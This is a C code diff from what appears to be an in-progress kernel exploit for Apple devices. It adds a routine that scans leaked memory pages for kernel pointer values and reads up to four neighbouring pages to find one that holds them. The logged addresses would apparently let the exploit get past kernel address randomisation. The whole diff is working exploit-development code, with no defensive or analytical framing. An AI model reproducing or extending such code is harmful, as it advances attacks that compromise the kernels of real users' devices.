@@ -376,6 +376,54 @@ static CFNumberRef RCNUM(int64_t v) {
             pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
             uint64_t got = 0; int32_t delta = 0;
             rc_cls_t c = rc_cls(rbBuf, expected, npages, &got, &delta);
+            /* v3 calib-aim: on WRONG/FOREIGN (the user's 3+-tap real-content
+               hits) classify EVERY qword with the cs2 v3 law — both pointer
+               bands (0xfffffff0 = 26.x/23F77, 0xfffffe00 = 24A-band) — then
+               walk +/-4 pages in this map hunting the pointer-bearing page.
+               THE KPTR ROW HERE = the receipt-class lane on REAL calib hits. */
+            if (c == C_WRONG || c == C_FOREIGN) {
+                static uint64_t calibAim = 0;
+                if (calibAim++ < 12) {
+                    uint64_t kptrs[8] = {0}; int kn = 0, cont = 0, zro = 0;
+                    for (size_t qi = 0; qi < RC_NQ; qi++) {
+                        uint64_t q = rbBuf[qi];
+                        if (q == hmarker) continue;
+                        if (q == 0) { zro++; continue; }
+                        if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
+                            q >= 0xfffffe0000000000ull) {
+                            if (kn < 8) kptrs[kn++] = q;
+                        }
+                        cont++;
+                    }
+                    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s",
+                           c == C_WRONG ? "WRONG" : "FOREIGN",
+                           (unsigned long long)cont, (unsigned long long)zro,
+                           (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
+                    for (int ki = 0; ki < kn; ki++)
+                        rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
+                    /* the +/-4-page walk in THIS map */
+                    for (int st = 1; st <= 4 && kn == 0; st++) {
+                        uint8_t wb[sizeof(rbBuf)];
+                        ssize_t wn = pread(fdMark, wb, sizeof(wb), 0x4000 + (off_t)st * 0x4000);
+                        if (wn < 8) break;
+                        uint64_t *wq8 = (uint64_t *)wb;
+                        int wkn = 0, wcont = 0; uint64_t wfirst = 0;
+                        for (size_t qi = 0; qi < RC_NQ; qi++) {
+                            uint64_t q = wq8[qi];
+                            if (q == 0) continue;
+                            wcont++;
+                            if (wfirst == 0) wfirst = q;
+                            if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
+                                q >= 0xfffffe0000000000ull) wkn++;
+                        }
+                        if (wcont)
+                            rc_log("  AIM-walk +%#02x content=%llu kptr=%llu first=0x%016llx",
+                                   (st * 0x4000), (unsigned long long)wcont,
+                                   (unsigned long long)wkn, (unsigned long long)wfirst);
+                        if (wkn > 0) break;
+                    }
+                }
+            }
             uint64_t *bM0 = isFail ? &flM0 : &okM0;
             uint64_t *bC  = isFail ? &flC  : &okC;
             uint64_t *bW  = isFail ? &flW  : &okW;
